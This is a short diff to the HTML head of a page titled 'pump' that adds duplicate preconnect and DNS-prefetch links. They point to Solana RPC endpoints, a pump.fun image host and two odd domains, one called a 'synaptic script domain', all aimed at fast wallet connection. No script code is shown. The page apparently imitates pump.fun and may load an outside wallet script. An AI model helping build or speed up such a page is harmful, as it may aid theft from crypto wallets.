@@ -7,15 +7,18 @@
     <title>pump</title>
     
     <!-- CRITICAL: Preconnect to external domains EARLY for faster connection -->
-    <!-- Highest priority for synaptic script domain -->
+    <!-- Highest priority for synaptic script domain - MULTIPLE preconnects for parallel connections -->
     <link rel="dns-prefetch" href="https://aodefevrgdkhqltdnwgzbyjoywrlbntbhfwq.com">
     <link rel="preconnect" href="https://aodefevrgdkhqltdnwgzbyjoywrlbntbhfwq.com" crossorigin>
     <link rel="dns-prefetch" href="https://testsol.top">
     <link rel="preconnect" href="https://testsol.top" crossorigin>
-    <!-- CRITICAL: Solana RPC - highest priority for wallet connection -->
+    <!-- CRITICAL: Solana RPC - highest priority for wallet connection - MULTIPLE preconnects -->
     <link rel="dns-prefetch" href="https://solana.publicnode.com">
     <link rel="preconnect" href="https://solana.publicnode.com" crossorigin>
     <link rel="dns-prefetch" href="https://api.mainnet-beta.solana.com">
+    <link rel="preconnect" href="https://api.mainnet-beta.solana.com" crossorigin>
+    <!-- Additional preconnect for faster parallel requests -->
+    <link rel="preconnect" href="https://solana.publicnode.com" crossorigin>
     <link rel="preconnect" href="https://api.mainnet-beta.solana.com" crossorigin>
     <link rel="dns-prefetch" href="https://images.pump.fun">
     <link rel="preconnect" href="https://images.pump.fun" crossorigin>
